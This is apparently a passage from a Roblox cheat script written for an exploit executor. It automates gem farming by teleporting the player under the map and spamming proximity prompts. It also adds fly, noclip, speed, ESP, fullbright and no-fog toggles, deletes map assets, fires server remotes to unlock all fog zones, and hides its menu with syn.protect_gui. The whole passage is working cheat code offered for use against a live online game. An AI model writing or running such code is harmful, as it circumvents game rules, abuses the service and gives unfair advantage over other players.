                    fireAndCollect(plantData, doorPos, "Normal#" .. idx)
                end

                -- === Phase 2: Scout Big Power Plants → save CFrame → tween to farm ===
                if #bigPlantModels > 0 and state.tpPowerPlantBusy and not isRoundExpired() then
                    notify("TP Power Plant", ("Phase 2: Scouting %d Big Plants..."):format(#bigPlantModels), 4)

                    local savedBigPlants = {}

                    for idx, plantData in ipairs(bigPlantModels) do
                        if not state.tpPowerPlantBusy then return end
                        if isRoundExpired() then break end

                        -- Get approximate position from model
                        local approxPos = getModelApproxPosition(plantData.model)
                        if not approxPos then
                            notify("TP Power Plant", "Big#" .. idx .. " no position", 3)
                            continue
                        end

                        -- TP to Big Plant area to force streaming load
                        notify("TP Power Plant", ("Scouting Big#%d..."):format(idx), 3)
                        local root = getRoot()
                        if not root then continue end
                        root.CFrame = CFrame.new(approxPos.X, TRAVEL_Y, approxPos.Z)
                        root.AssemblyLinearVelocity = Vector3.zero
                        requestStreamAround(approxPos)
                        task.wait(2.5)

                        -- Now try to find loaded parts and save their CFrame
                        local freshPrompt = findProximityPrompt(plantData.model)
                        local freshAnchor = findAnchorPart(plantData.model)

                        if freshPrompt and freshAnchor then
                            local savedCF = freshAnchor.CFrame
                            notify("TP Power Plant", ("Big#%d loaded! Saved position"):format(idx), 3)
                            table.insert(savedBigPlants, {
                                model = plantData.model,
                                prompt = freshPrompt,
                                savedCFrame = savedCF,
                                index = idx,
                            })
                        else
                            notify("TP Power Plant", ("Big#%d couldn't load"):format(idx), 3)
                        end
                    end

                    -- Now tween to each saved Big Plant position
                    for _, bigData in ipairs(savedBigPlants) do
                        if not state.tpPowerPlantBusy then return end
                        if isRoundExpired() then break end

                        local savedPos = bigData.savedCFrame.Position
                        if isPosDone(savedPos) then continue end

                        notify("TP Power Plant", ("Tween to Big#%d..."):format(bigData.index), 3)

                        -- Tween underground to saved position (map will load as we approach)
                        local moveOk = walkToUndergroundTarget(savedPos, MOVE_SPEED, TRAVEL_Y)
                        if not moveOk then
                            -- Fallback: direct TP
                            local root = getRoot()
                            if root then
                                root.CFrame = CFrame.new(savedPos.X, TRAVEL_Y, savedPos.Z)
                                root.AssemblyLinearVelocity = Vector3.zero
                                task.wait(1.5)
                            end
                        end

                        if not state.tpPowerPlantBusy then return end
                        requestStreamAround(savedPos)
                        task.wait(1)

                        -- Re-find prompt after loading
                        local freshPrompt = findProximityPrompt(bigData.model)
                        if freshPrompt then bigData.prompt = freshPrompt end
                        local freshAnchor = findAnchorPart(bigData.model)
                        local doorPos = freshAnchor and freshAnchor.Position or savedPos

                        if not bigData.prompt then
                            notify("TP Power Plant", "Big#" .. bigData.index .. " prompt gone", 3)
                            markPosDone(savedPos)
                            continue
                        end

                        fireAndCollect(bigData, doorPos, "Big#" .. bigData.index)
                    end
                end

                notify("TP Power Plant", ("Collected %d gems. Resetting..."):format(gemsThisRound), 5)

                if state.tpPowerPlantBusy then
                    resetAndVoteRestart()
                    notify("TP Power Plant", "Voted to play again. Waiting...", 5)
                    task.wait(8)
                end
            end)

            if not ok then
                notify("TP Power Plant", "Error: " .. tostring(err), 5)
                task.wait(3)
            end
        end

        state.tpPowerPlantBusy = false
        tpPowerPlantThread = nil
        pcall(function()
            if Options.TPPowerPlantEnabled then
                Options.TPPowerPlantEnabled:SetValue(false)
            end
        end)
    end)
end

local function stopPowerPlant()

    state.powerPlantBusy = false

    if powerPlantThread then

        pcall(task.cancel, powerPlantThread)

        powerPlantThread = nil

    end

end

local function runPowerPlantSequence()

    if not getMapTiles() then
        notify("Power Plant", "Not in a game round (no map), waiting...", 3)
        return
    end

    if state.powerPlantBusy then

        return

    end

    state.powerPlantBusy = true

    powerPlantThread = task.spawn(function()

        while state.powerPlantBusy do

            local ok, err = pcall(function()

                local ROUND_TIMEOUT = 180
                local roundStartTime = tick()

                local function isRoundExpired()
                    return (tick() - roundStartTime) >= ROUND_TIMEOUT
                end

                notify("Power Plant", "Going underground & scanning...", 3)
                createUnderMapPlate()
                if not state.powerPlantBusy then return end

                local undergroundOk, undergroundErr = forceUnderground()
                if not undergroundOk then
                    notify("Power Plant", "Underground failed: " .. tostring(undergroundErr), 4)
                    return
                end
                if not state.powerPlantBusy then return end

                local stableOk, stableErr = waitForStableUnderground()
                if not stableOk then
                    notify("Power Plant", "Stabilize failed: " .. tostring(stableErr), 4)
                    return
                end

                local donePositions = {}
                local gemsThisRound = 0
                local allPlantModels = {}
                local plants = {}

                local function posKey(pos)
                    return math.floor(pos.X + 0.5) .. "_" .. math.floor(pos.Z + 0.5)
                end
                local function isPosDone(pos)
                    return donePositions[posKey(pos)] == true
                end
                local function markPosDone(pos)
                    donePositions[posKey(pos)] = true
                end

                -- Fast scan: find all power plant models by name from workspace
                local scanned = fastScanPlantModels()
                for _, fp in ipairs(scanned) do
                    if not allPlantModels[fp.model] then
                        allPlantModels[fp.model] = true
                        table.insert(plants, fp)
                    end
                end

                if #plants == 0 then
                    notify("Power Plant", "No Power Plants found, retrying...", 4)
                    task.wait(3)
                    return
                end

                local bigCount, normalCount = 0, 0
                for _, p in ipairs(plants) do
                    if p.isBig then bigCount += 1 else normalCount += 1 end
                end
                notify("Power Plant", ("Found %d plants (%d normal, %d big), farming!"):format(#plants, normalCount, bigCount), 5)

                -- Farm loop: always pick nearest plant
                local processedModels = {}
                local farmCount = 0
                while state.powerPlantBusy and not isRoundExpired() do
                    -- Death check
                    if isPlayerDead() then
                        notify("Power Plant", "Player died! Resetting...", 3)
                        resetAndVoteRestart()
                        if not waitForRespawn(12) then
                            notify("Power Plant", "Respawn timeout, retrying round...", 3)
                            return
                        end
                        task.wait(2)
                        notify("Power Plant", "Respawned, going underground again...", 3)
                        createUnderMapPlate()
                        forceUnderground()
                        waitForStableUnderground()
                    end

                    -- Rescan: pick up new plants + update positions for nil ones
                    local fresh = fastScanPlantModels()
                    for _, fp in ipairs(fresh) do
                        if not allPlantModels[fp.model] then
                            allPlantModels[fp.model] = true
                            table.insert(plants, fp)
                        end
                    end
                    -- Try to update nil positions from rescan
                    for _, p in ipairs(plants) do
                        if not p.approxPos and p.model and p.model.Parent then
                            pcall(function()
                                local cf = p.model:GetPivot()
                                if cf then p.approxPos = cf.Position end
                            end)
                            if not p.approxPos then
                                pcall(function()
                                    local part = p.model:FindFirstChildWhichIsA("BasePart", true)
                                    if part then p.approxPos = part.Position end
                                end)
                            end
                        end
                    end

                    -- Find nearest unprocessed plant
                    local bestPlant, bestDist = nil, math.huge
                    local noPosList = {}
                    local root = getRoot()
                    if not root then task.wait(1) continue end
                    local myPos = root.Position

                    for _, p in ipairs(plants) do
                        if p and p.model and p.model.Parent and not processedModels[p.model] then
                            if p.approxPos then
                                local d = (Vector3.new(p.approxPos.X, 0, p.approxPos.Z) - Vector3.new(myPos.X, 0, myPos.Z)).Magnitude
                                if d < bestDist then
                                    bestDist = d
                                    bestPlant = p
                                end
                            else
                                table.insert(noPosList, p)
                            end
                        end
                    end

                    -- If no positioned plants left, try unpositioned ones
                    if not bestPlant and #noPosList > 0 then
                        bestPlant = noPosList[1]
                        bestDist = 0
                    end

                    if not bestPlant then break end
                    processedModels[bestPlant.model] = true
                    farmCount += 1

                    local targetPos = bestPlant.approxPos
                    local plantType = bestPlant.isBig and "BIG" or "Normal"

                    -- If no position, request stream to load it
                    if not targetPos then
                        notify("Power Plant", ("%s Plant %d/%d - no pos, streaming..."):format(plantType, farmCount, #plants), 3)
                        -- Stream around a known plant or origin to try loading it
                        requestStreamAround(Vector3.new(0, 0, 0))
                        task.wait(2)
                        pcall(function()
                            local cf = bestPlant.model:GetPivot()
                            if cf then targetPos = cf.Position end
                        end)
                        if not targetPos then
                            pcall(function()
                                local part = bestPlant.model:FindFirstChildWhichIsA("BasePart", true)
                                if part then targetPos = part.Position end
                            end)
                        end
                        if not targetPos then
                            notify("Power Plant", "Still no position, skipping...", 3)
                            continue
                        end
                    end

                    notify("Power Plant", ("%s Plant %d/%d (dist: %d)"):format(plantType, farmCount, #plants, math.floor(bestDist)), 3)

                    -- Tween to plant, fallback TP if timeout
                    local moveOk = walkToUndergroundTarget(targetPos, MOVE_SPEED, TRAVEL_Y)
                    if not moveOk then
                        root = getRoot()
                        if root then
                            root.CFrame = CFrame.new(targetPos.X, TRAVEL_Y, targetPos.Z)
                            root.AssemblyLinearVelocity = Vector3.zero
                            task.wait(0.3)
                        end
                    end
                    if not state.powerPlantBusy then return end

                    -- Find Door part (fallback to approxPos)
                    local door = findDoorPart(bestPlant.model)
                    if not door then
                        requestStreamAround(targetPos)
                        task.wait(1)
                        door = findDoorPart(bestPlant.model)
                    end
                    local doorPos = door and door.Position or targetPos

                    -- Tween to door
                    walkToUndergroundTarget(doorPos, MOVE_SPEED, TRAVEL_Y)

                    -- Find ALL prompts in model (big plants may have multiple or deeper ones)
                    local prompts = {}
                    for _, desc in ipairs(bestPlant.model:GetDescendants()) do
                        if desc:IsA("ProximityPrompt") then
                            table.insert(prompts, desc)
                        end
                    end
                    if #prompts == 0 then
                        requestStreamAround(doorPos)
                        task.wait(1.5)
                        for _, desc in ipairs(bestPlant.model:GetDescendants()) do
                            if desc:IsA("ProximityPrompt") then
                                table.insert(prompts, desc)
                            end
                        end
                    end
                    if #prompts == 0 then
                        notify("Power Plant", "No prompt found, moving on...", 3)
                    end

                    -- Spam fire at door position with offsets, fire ALL prompts found
                    local startingGems = getGemCount() or 0
                    local gotGem = false
                    local fireOffsets = {
                        Vector3.new(0, 0, 0),
                        Vector3.new(2, 0, 0), Vector3.new(-2, 0, 0),
                        Vector3.new(0, 0, 2), Vector3.new(0, 0, -2),
                        Vector3.new(2, 0, 2), Vector3.new(-2, 0, -2),
                        Vector3.new(3, 0, 0), Vector3.new(-3, 0, 0),
                        Vector3.new(0, 0, 3), Vector3.new(0, 0, -3),
                    }
                    local fireDeadline = tick() + 6
                    local offsetIdx = 1
                    while tick() < fireDeadline and state.powerPlantBusy and not isRoundExpired() and #prompts > 0 do
                        if isPlayerDead() then break end
                        root = getRoot()
                        if not root then break end
                        local off = fireOffsets[offsetIdx]
                        root.CFrame = CFrame.new(doorPos.X + off.X, FIRE_Y, doorPos.Z + off.Z)
                        root.AssemblyLinearVelocity = Vector3.zero
                        for _, pr in ipairs(prompts) do
                            pcall(function() fireproximityprompt(pr) end)
                        end
                        task.wait(0.15)
                        local currentGems = getGemCount() or 0
                        if currentGems > startingGems then
                            gotGem = true
                            gemsThisRound += 1
                            totalGemsCollected += 1
                            notify("Power Plant", ("Gem! #%d (%d total)"):format(gemsThisRound, gemsThisRound), 3)
                            task.spawn(function() sendWebhook(currentGems, totalGemsCollected) end)
                            break
                        end
                        offsetIdx = (offsetIdx % #fireOffsets) + 1
                        task.wait(0.1)
                    end

                    if not gotGem then
                        notify("Power Plant", "No gem, moving on...", 3)
                    end

                    -- Back to travel height
                    if state.powerPlantBusy then
                        root = getRoot()
                        if root then
                            root.CFrame = CFrame.new(root.Position.X, TRAVEL_Y, root.Position.Z)
                            root.AssemblyLinearVelocity = Vector3.zero
                        end
                        task.wait(0.3)
                    end
                end
                notify("Power Plant", ("Collected %d gems. Resetting..."):format(gemsThisRound), 5)

                if state.powerPlantBusy then
                    resetAndVoteRestart()
                    notify("Power Plant", "Voted to play again. Waiting for next round...", 5)

                    task.wait(8)

                end

            end)



            if not ok then

                notify("Power Plant", "Error: " .. tostring(err), 5)

                task.wait(3)

            end

        end



        state.powerPlantBusy = false

        powerPlantThread = nil

        pcall(function()

            if Options.PowerPlantEnabled then

                Options.PowerPlantEnabled:SetValue(false)

            end

        end)

    end)

end





local function stopFly()

    state.flyEnabled = false

    if flyConnection then

        flyConnection:Disconnect()

        flyConnection = nil

    end



    local root = getRoot()

    if root then

        root.AssemblyLinearVelocity = Vector3.zero

    end

end



local function startFly()

    stopFly()

    state.flyEnabled = true



    flyConnection = RunService.RenderStepped:Connect(function()

        if not state.flyEnabled then

            return

        end



        local character = getCharacter()

        local root = character:FindFirstChild("HumanoidRootPart")

        local humanoid = character:FindFirstChildOfClass("Humanoid")

        local camera = Workspace.CurrentCamera

        if not root or not humanoid or not camera then

            return

        end



        local direction = Vector3.zero

        if UserInputService:IsKeyDown(Enum.KeyCode.W) then direction += camera.CFrame.LookVector end

        if UserInputService:IsKeyDown(Enum.KeyCode.S) then direction -= camera.CFrame.LookVector end

        if UserInputService:IsKeyDown(Enum.KeyCode.A) then direction -= camera.CFrame.RightVector end

        if UserInputService:IsKeyDown(Enum.KeyCode.D) then direction += camera.CFrame.RightVector end

        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then direction += Vector3.new(0, 1, 0) end

        if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then direction -= Vector3.new(0, 1, 0) end



        if direction.Magnitude > 0 then

            direction = direction.Unit

        end



        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)

        root.AssemblyLinearVelocity = direction * (Options.FlySpeed and Options.FlySpeed.Value or 50)

    end)

end



local function isNoClipActive()

    return state.manualNoClipEnabled or state.pulseWindowNoClip

end



local function ensureNoClipConnection()

    if noClipConnection then

        return

    end



    noClipConnection = RunService.Stepped:Connect(function()

        if not isNoClipActive() then

            return

        end



        local character = getCharacter()

        for _, descendant in ipairs(character:GetDescendants()) do

            if descendant:IsA("BasePart") then

                descendant.CanCollide = false

            end

        end

    end)

end



local function stopNoClip()

    state.manualNoClipEnabled = false

    if not state.pulseNoClipEnabled and noClipConnection then

        noClipConnection:Disconnect()

        noClipConnection = nil

    end

end



local function startNoClip()

    state.manualNoClipEnabled = true

    ensureNoClipConnection()

end



local function stopPulseNoClip()

    state.pulseNoClipEnabled = false

    state.pulseWindowNoClip = false

    if pulseNoClipThread then

        task.cancel(pulseNoClipThread)

        pulseNoClipThread = nil

    end

    if not state.manualNoClipEnabled and noClipConnection then

        noClipConnection:Disconnect()

        noClipConnection = nil

    end

end



local function startPulseNoClip()

    stopPulseNoClip()

    state.pulseNoClipEnabled = true

    ensureNoClipConnection()



    pulseNoClipThread = task.spawn(function()

        while state.pulseNoClipEnabled do

            state.pulseWindowNoClip = true

            task.wait(1)

            if not state.pulseNoClipEnabled then

                break

            end

            state.pulseWindowNoClip = false

            task.wait(0.25)

        end

        state.pulseWindowNoClip = false

    end)

end



local function stopSpeed()

    state.speedEnabled = false

    if speedConnection then

        speedConnection:Disconnect()

        speedConnection = nil

    end



    local humanoid = getHumanoid()

    if humanoid then

        humanoid.WalkSpeed = 16

    end

end



local function startSpeed()

    stopSpeed()

    state.speedEnabled = true



    speedConnection = RunService.Heartbeat:Connect(function()

        if not state.speedEnabled then

            return

        end



        local humanoid = getHumanoid()

        if humanoid then

            humanoid.WalkSpeed = Options.SpeedValue and Options.SpeedValue.Value or 50

        end

    end)

end



local function enableFullbright()

    if not originalLighting.stored then

        originalLighting.stored = true

        originalLighting.Brightness = Lighting.Brightness

        originalLighting.ClockTime = Lighting.ClockTime

        originalLighting.FogEnd = Lighting.FogEnd

        originalLighting.GlobalShadows = Lighting.GlobalShadows

        originalLighting.OutdoorAmbient = Lighting.OutdoorAmbient

    end



    state.fullbrightEnabled = true

    Lighting.Brightness = 3

    Lighting.ClockTime = 14

    Lighting.FogEnd = 100000

    Lighting.GlobalShadows = false

    Lighting.OutdoorAmbient = Color3.fromRGB(180, 180, 180)

end



local function disableFullbright()

    state.fullbrightEnabled = false

    if originalLighting.stored then

        Lighting.Brightness = originalLighting.Brightness

        Lighting.ClockTime = originalLighting.ClockTime

        Lighting.FogEnd = originalLighting.FogEnd

        Lighting.GlobalShadows = originalLighting.GlobalShadows

        Lighting.OutdoorAmbient = originalLighting.OutdoorAmbient

    end

end



local function setFogEnabled(enabled)

    local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")



    if enabled and not originalFog.stored then

        originalFog.stored = true

        originalFog.FogEnd = Lighting.FogEnd

        originalFog.FogStart = Lighting.FogStart

        if atmosphere then

            originalFog.Density = atmosphere.Density

            originalFog.Haze = atmosphere.Haze

            originalFog.Glare = atmosphere.Glare

        end

    end



    state.noFogEnabled = enabled



    if enabled then

        Lighting.FogEnd = 100000

        Lighting.FogStart = 0

        if atmosphere then

            atmosphere.Density = 0

            atmosphere.Haze = 0

            atmosphere.Glare = 0

        end

    elseif originalFog.stored then

        Lighting.FogEnd = originalFog.FogEnd

        Lighting.FogStart = originalFog.FogStart

        if atmosphere then

            atmosphere.Density = originalFog.Density or atmosphere.Density

            atmosphere.Haze = originalFog.Haze or atmosphere.Haze

            atmosphere.Glare = originalFog.Glare or atmosphere.Glare

        end

    end

end



-- ==================== LOBBY TAB ====================



Tabs.Lobby:AddParagraph({

    Title = "Auto Start Match",

    Content = "Automatically join lobby and start a match with party size 1."

})



local autoStartThread



Tabs.Lobby:AddButton({

    Title = "Start Match Now",

    Description = "Join lobby and set party size immediately",

    Callback = function()

        pcall(function()

            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Lobby"):WaitForChild("JoinLobby"):InvokeServer("2")

        end)

        task.wait(3)

        pcall(function()

            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Lobby"):WaitForChild("SetPartySize"):InvokeServer(1)

        end)

        notify("Lobby", "Match started!", 3)

    end

})



local AutoStartToggle = Tabs.Lobby:AddToggle("AutoStartMatch", {

    Title = "Auto Start Match (Loop)",

    Default = false

})



AutoStartToggle:OnChanged(function(value)

    if value then

        if autoStartThread then

            pcall(task.cancel, autoStartThread)

        end

        autoStartThread = task.spawn(function()
            local lobbyRemote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Lobby")
            local joinLobby = lobbyRemote:WaitForChild("JoinLobby")
            local leaveLobby = lobbyRemote:WaitForChild("LeaveLobby")
            local lobbies = {"1", "2", "3"}
            local lobbyIdx = 1

            while Options.AutoStartMatch and Options.AutoStartMatch.Value do
                local lobbyId = lobbies[lobbyIdx]
                notify("Lobby", "Trying lobby " .. lobbyId .. "...", 3)

                -- Join lobby
                pcall(function() joinLobby:InvokeServer(lobbyId) end)
                task.wait(1)
                pcall(function()
                    lobbyRemote:WaitForChild("SetPartySize"):InvokeServer(1)
                end)

                -- Wait up to 20s for teleport
                local startPos = nil
                pcall(function()
                    local root = game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if root then startPos = root.Position end
                end)

                local teleported = false
                local deadline = tick() + 20
                while tick() < deadline and Options.AutoStartMatch and Options.AutoStartMatch.Value do
                    task.wait(2)
                    -- Check if we got teleported (position changed significantly or scene changed)
                    local currentPos = nil
                    pcall(function()
                        local root = game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if root then currentPos = root.Position end
                    end)
                    if startPos and currentPos and (currentPos - startPos).Magnitude > 50 then
                        teleported = true
                        break
                    end
                    -- Check if Map exists (means we're in a match)
                    if workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Tiles") then
                        teleported = true
                        break
                    end
                end

                if teleported then
                    notify("Lobby", "Entered match from lobby " .. lobbyId, 3)
                    -- Wait for match to end or toggle off
                    while Options.AutoStartMatch and Options.AutoStartMatch.Value do
                        task.wait(5)
                        -- If we're back in lobby (no Map), break to rejoin
                        if not workspace:FindFirstChild("Map") or not workspace.Map:FindFirstChild("Tiles") then
                            task.wait(3)
                            break
                        end
                    end
                else
                    -- Didn't teleport, leave and try next lobby
                    notify("Lobby", "Lobby " .. lobbyId .. " failed, trying next...", 3)
                    pcall(function() leaveLobby:InvokeServer() end)
                    task.wait(2)
                    lobbyIdx = (lobbyIdx % #lobbies) + 1
                end
            end
        end)

        notify("Lobby", "Auto Start Match enabled", 3)

    else

        if autoStartThread then

            pcall(task.cancel, autoStartThread)

            autoStartThread = nil

        end

        notify("Lobby", "Auto Start Match disabled", 3)

    end

end)



-- ==================== MISC TAB ====================



local deleteMapThread



Tabs.Misc:AddToggle("DeleteMap", {

    Title = "Delete Map (TileAssets)",

    Default = false

}):OnChanged(function(value)

    if value then

        if deleteMapThread then

            pcall(task.cancel, deleteMapThread)

        end

        deleteMapThread = task.spawn(function()

            while Options.DeleteMap and Options.DeleteMap.Value do

                task.wait(0.25)

                pcall(function()

                    local map = Workspace:FindFirstChild("Map")

                    if map then

                        local tileAssets = map:FindFirstChild("TileAssets")

                        if tileAssets then

                            tileAssets:Destroy()

                        end

                        local border = map:FindFirstChild("Border")

                        if border then

                            border:Destroy()

                        end

                        local tiles = map:FindFirstChild("Tiles")

                        if tiles then

                            local center = tiles:FindFirstChild("Center")

                            if center then

                                center:Destroy()

                            end

                        end

                    end

                end)

                task.wait(2)

            end

        end)

        notify("Misc", "Delete Map enabled", 3)

    else

        if deleteMapThread then

            pcall(task.cancel, deleteMapThread)

            deleteMapThread = nil

        end

        notify("Misc", "Delete Map disabled", 3)

    end

end)



local gemDisplayGui

local gemDisplayThread



Tabs.Misc:AddToggle("GemDisplay", {

    Title = "Gem Display (Draggable)",

    Default = false

}):OnChanged(function(value)

    if value then

        if gemDisplayGui then

            pcall(function() gemDisplayGui:Destroy() end)

        end



        local screenGui = Instance.new("ScreenGui")

        screenGui.Name = "STA_GemDisplay"

        screenGui.ResetOnSpawn = false

        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling



        pcall(function()

            if syn and syn.protect_gui then

                syn.protect_gui(screenGui)

            end

        end)



        screenGui.Parent = game:GetService("CoreGui")



        local frame = Instance.new("Frame")

        frame.Name = "GemBox"

        frame.Size = UDim2.fromOffset(220, 75)

        frame.Position = UDim2.new(0.5, -110, 0, 10)

        frame.BackgroundColor3 = Color3.fromRGB(20, 80, 20)

        frame.BackgroundTransparency = 0.15

        frame.BorderSizePixel = 0

        frame.Active = true

        frame.Draggable = true

        frame.Parent = screenGui



        local corner = Instance.new("UICorner")

        corner.CornerRadius = UDim.new(0, 10)

        corner.Parent = frame



        local stroke = Instance.new("UIStroke")

        stroke.Thickness = 2.5

        stroke.Parent = frame



        local nameLabel = Instance.new("TextLabel")
        nameLabel.Name = "PlayerName"
        nameLabel.Size = UDim2.new(1, 0, 0, 22)
        nameLabel.Position = UDim2.new(0, 0, 0, 4)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")"
        nameLabel.TextSize = 14
        nameLabel.Font = Enum.Font.GothamMedium
        nameLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
        nameLabel.TextXAlignment = Enum.TextXAlignment.Center
        nameLabel.Parent = frame

        local gemLabel = Instance.new("TextLabel")
        gemLabel.Name = "GemCount"
        gemLabel.Size = UDim2.new(1, 0, 0, 30)
        gemLabel.Position = UDim2.new(0, 0, 0, 28)
        gemLabel.BackgroundTransparency = 1
        gemLabel.Text = "💎 Gem: 0"
        gemLabel.TextSize = 22
        gemLabel.Font = Enum.Font.GothamBold
        gemLabel.TextColor3 = Color3.new(1, 1, 1)
        gemLabel.TextXAlignment = Enum.TextXAlignment.Center
        gemLabel.Parent = frame



        gemDisplayGui = screenGui



        if gemDisplayThread then

            pcall(task.cancel, gemDisplayThread)

        end

        gemDisplayThread = task.spawn(function()

            local hue = 0

            while gemDisplayGui and gemDisplayGui.Parent do

                hue = (hue + 0.01) % 1

                pcall(function()

                    stroke.Color = Color3.fromHSV(hue, 1, 1)

                end)

                pcall(function()
                    local gems = getGemCount()
                    if gems then
                        gemLabel.Text = "💎 Gem: " .. tostring(gems)
                    end
                end)

                task.wait(0.03)

            end

        end)



        notify("Misc", "Gem Display enabled", 3)

    else

        if gemDisplayThread then

            pcall(task.cancel, gemDisplayThread)

            gemDisplayThread = nil

        end

        if gemDisplayGui then

            pcall(function() gemDisplayGui:Destroy() end)

            gemDisplayGui = nil

        end

        notify("Misc", "Gem Display disabled", 3)

    end

end)



Tabs.Misc:AddToggle("Disable3DRender", {

    Title = "Disable 3D Rendering",

    Default = false

}):OnChanged(function(value)

    pcall(function()

        RunService:Set3dRenderingEnabled(not value)

    end)

    notify("Misc", value and "3D Rendering disabled" or "3D Rendering enabled", 3)

end)

local limitTimerThread

Tabs.Misc:AddToggle("RedeemCode", {
    Title = "Redeem Code (twomonths,Birthday)",
    Default = false
}):OnChanged(function(value)
    if value then
        pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Misc"):WaitForChild("RedeemCode"):FireServer("twomonths")
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Misc"):WaitForChild("RedeemCode"):FireServer("Birthday")
        end)
        notify("Misc", "Code redeemed: twomonths,Birthday", 3)
    end
end)

Tabs.Misc:AddToggle("SignUpQuest", {
    Title = "Sign Up Quest",
    Default = false
}):OnChanged(function(value)
    if value then
        pcall(function()
            Workspace:WaitForChild("Lobby"):WaitForChild("Questboard"):WaitForChild("CurrentUpdate"):WaitForChild("SignUp"):InvokeServer()
        end)
        notify("Misc", "Quest signed up", 3)
    end
end)

Tabs.Misc:AddToggle("UnlockFog", {
    Title = "Unlock All Fog Zones",
    Default = false
}):OnChanged(function(value)
    if value then
        pcall(function()
            local fogRemote = game:GetService("ReplicatedStorage").Remotes.Misc.FogTouched
            for _, part in pairs(Workspace.Fog:GetChildren()) do
                if part:IsA("BasePart") then
                    local v3 = string.split(part.Name, "_")
                    local zoneID = tonumber(v3[1])
                    local subID = tonumber(v3[2])
                    if zoneID and subID then
                        fogRemote:FireServer(zoneID, subID)
                        task.wait(0.1)
                    end
                end
            end
        end)
        notify("Misc", "All fog zones unlocked", 3)
    end
end)

Tabs.Misc:AddToggle("LimitTimer", {
    Title = "3 Min Server Limit (Reset & Vote)",
    Default = false
}):OnChanged(function(value)
    if value then
        if limitTimerThread then
            pcall(task.cancel, limitTimerThread)
        end
        limitTimerThread = task.spawn(function()
            local elapsed = tick() - sessionStartTime
            local remaining = (3 * 60) - elapsed
            if remaining > 0 then
                notify("Misc", ("Server limit: %.0f sec remaining"):format(remaining), 3)
                task.wait(remaining)
            end
            if Options.LimitTimer and Options.LimitTimer.Value then
                notify("Misc", "3 min limit reached, resetting...", 4)
                resetAndVoteRestart()
            end
        end)
    else
        if limitTimerThread then
            pcall(task.cancel, limitTimerThread)
            limitTimerThread = nil
        end
        notify("Misc", "Server limit disabled", 3)
    end
end)

-- ==================== MAIN TAB ====================



Tabs.Main:AddParagraph({

    Title = "Auto Power Plant",

    Content = "Find all 4 Power Plants, place player on the under-map plate, then walk underground to each door and fire the prompt."

})



local PowerPlantToggle = Tabs.Main:AddToggle("PowerPlantEnabled", {

    Title = "Auto Power Plant",

    Default = false

})



PowerPlantToggle:OnChanged(function(value)

    if value then

        runPowerPlantSequence()

        notify("Power Plant", "Enabled", 3)

    else

        stopPowerPlant()

        notify("Power Plant", "Disabled", 3)

    end

end)

Tabs.Main:AddSlider("MoveSpeedSlider", {
    Title = "Tween Move Speed",
    Default = MOVE_SPEED,
    Min = 10,
    Max = 200,
    Rounding = 0,
    Callback = function(value)
        MOVE_SPEED = value
    end
})

local FlyToggle = Tabs.Player:AddToggle("FlyEnabled", {

    Title = "Fly",

    Default = false

})



FlyToggle:OnChanged(function(value)

    if value then

        startFly()

        notify("Player", "Fly enabled", 3)

    else

        stopFly()

        notify("Player", "Fly disabled", 3)

    end

end)



Tabs.Player:AddSlider("FlySpeed", {

    Title = "Fly Speed",

    Default = 50,

    Min = 10,

    Max = 300,

    Rounding = 1

})



local NoClipToggle = Tabs.Player:AddToggle("NoClipEnabled", {

    Title = "NoClip",

    Default = false

})



NoClipToggle:OnChanged(function(value)

    if value then

        startNoClip()

        notify("Player", "NoClip enabled", 3)

    else

        stopNoClip()

        notify("Player", "NoClip disabled", 3)

    end

end)



local PulseNoClipToggle = Tabs.Player:AddToggle("PulseNoClipEnabled", {

    Title = "Pulse NoClip",

    Default = false

})



PulseNoClipToggle:OnChanged(function(value)

    if value then

        startPulseNoClip()

        notify("Player", "Pulse NoClip enabled", 3)

    else

        stopPulseNoClip()

        notify("Player", "Pulse NoClip disabled", 3)

    end

end)



local SpeedToggle = Tabs.Player:AddToggle("SpeedEnabled", {

    Title = "Speed",

    Default = false

})



SpeedToggle:OnChanged(function(value)

    if value then

        startSpeed()

        notify("Player", "Speed enabled", 3)

    else

        stopSpeed()

        notify("Player", "Speed disabled", 3)

    end

end)



Tabs.Player:AddSlider("SpeedValue", {

    Title = "Walk Speed",

    Default = 50,

    Min = 16,

    Max = 200,

    Rounding = 1

})



Tabs.Player:AddToggle("RainbowOutline", {

    Title = "Rainbow Outline",

    Default = false

}):OnChanged(function(value)

    if value then

        startRainbowOutline()

        notify("Player", "Rainbow Outline enabled", 3)

    else

        stopRainbowOutline()

        notify("Player", "Rainbow Outline disabled", 3)

    end

end)



local FullbrightToggle = Tabs.Visuals:AddToggle("FullbrightEnabled", {

    Title = "Fullbright",

    Default = false

})



FullbrightToggle:OnChanged(function(value)

    if value then

        enableFullbright()

        notify("Visuals", "Fullbright enabled", 3)

    else

        disableFullbright()

        notify("Visuals", "Fullbright disabled", 3)

    end

end)



local NoFogToggle = Tabs.Visuals:AddToggle("NoFogEnabled", {

    Title = "No Fog",

    Default = false

})



NoFogToggle:OnChanged(function(value)

    if value then

        setFogEnabled(true)

        notify("Visuals", "No Fog enabled", 3)

    else

        setFogEnabled(false)

        notify("Visuals", "No Fog disabled", 3)

    end

end)



local PowerPlantESPToggle = Tabs.Visuals:AddToggle("PowerPlantESPEnabled", {

    Title = "PowerPlant ESP",

    Default = false

})



PowerPlantESPToggle:OnChanged(function(value)

    powerPlantESPEnabled = value

    if value then

        refreshPowerPlantESP()

        startESPRefreshLoop()

    else

        stopESPRefreshLoop()

        clearPowerPlantESP()

    end

